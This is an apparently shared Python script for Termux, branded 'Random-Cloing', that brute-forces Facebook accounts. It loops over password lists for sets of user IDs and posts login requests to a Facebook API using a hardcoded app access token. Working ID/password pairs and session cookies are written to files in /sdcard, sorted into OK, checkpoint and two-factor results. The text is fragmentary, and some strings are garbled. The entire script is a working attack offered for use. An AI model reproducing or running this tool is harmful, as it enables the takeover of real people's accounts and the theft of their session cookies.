#gift by Farabi vau
#open source by mr farabi#FFF400
#team termux course
import os
import sys,time
...
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mMD HAMZA Poramanik  
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92mFARABI-420
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m2.3Random-Cloing.pyRandom-Cloing.py#FF00B0
\33[1;91m[\33[1;97m★\33[1;91m] \33[1;92mTOOLS\033[1;97m     ●   \033[1;91m\033[1;41m\033[1;97m/RANDOM\033[;0m\033[1;91m\033[1;92m   
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
	print(f'\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        ...
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/sex.txt...')
                                linex()
...
def pak():
                ...
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python farabi.py')
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [AHMED-CP] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [AHMED-CP-CP] '+ids+' | '+pas+'\033[1;97m')
...
'Content-Length': '706'}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [RIMON-OK🔥] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RIMON-OK🔥.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AHMED-CP-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [AHMED-CP-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AHMED-CP-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/AHMED-CP-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [RIMON] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [RIMON-OK🔥] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/RIMON-COOKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/RIMON-OKID.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/RIMON-COOKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/RIMON-OK🔥.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
